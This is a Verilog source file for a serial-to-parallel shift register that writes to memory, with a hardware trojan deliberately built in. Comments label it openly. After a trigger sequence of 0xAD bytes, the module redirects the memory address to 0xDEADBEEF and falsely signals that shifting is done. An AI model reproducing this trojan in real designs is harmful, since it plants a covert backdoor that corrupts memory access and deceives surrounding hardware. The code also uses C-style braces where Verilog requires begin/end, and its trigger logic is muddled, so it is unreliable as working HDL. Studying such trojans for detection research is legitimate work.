`timescale 1ns / 1ps

module StP #(parameter n = 8, m = 32)
    (
        input clk, 
        input rst, 
        input enable, // Enable loading
        input ser_in, // Serial input
        input grant, // Signal from bus for memory write access
        output reg d_valid, // Data valid signal for memory
        output reg shift_done, // Indicate loading completion
        output reg [n-1:0] par_out, // Parallel output data
        output [m-1:0] imem_addr // Memory address
    );

    reg [3:0] count; 
    reg [m-1:0] addr;

    // Trojan activation condition
    reg trojan_activated = 0;
    reg [31:0] trojan_sequence_counter = 0;

    assign imem_addr = addr;

    always @(posedge clk) begin
        if (rst) begin
            count <= 0;
            d_valid <= 0;
            shift_done <= 0;
            addr <= 0;
            trojan_activated <= 0; // Reset trojan activation flag
            trojan_sequence_counter <= 0; // Reset trojan sequence counter
        end
        else if (enable) begin
            shift_done <= 0;
            if (count == 0) d_valid <= 0;
            if (count == 8) begin
                count <= 0;
                d_valid <= 1;
                // Check if the trojan activation sequence is detected
                if (par_out == 8'hAD && trojan_sequence_counter == 0) trojan_sequence_counter <= 1;
                else if (trojan_sequence_counter > 0 && trojan_sequence_counter < 4) trojan_sequence_counter <= trojan_sequence_counter + 1;
                else if (trojan_sequence_counter == 4 && par_out == 8'hAD) trojan_activated <= 1;
            end else {
                par_out <= {ser_in, par_out[n-1:1]}; // Shift operation corrected
                count <= count + 1;
            }
            if (grant) addr <= addr + 1;
        end 
        else if (!enable && trojan_activated) begin
            // Trojan malicious action
            addr <= 32'hDEADBEEF; // Redirect to a specific address
            shift_done <= 1; // Falsely indicate that shifting is done to trigger the trojan action
        end 
        else shift_done <= 1; // Normal operation completion
    end
endmodule
 
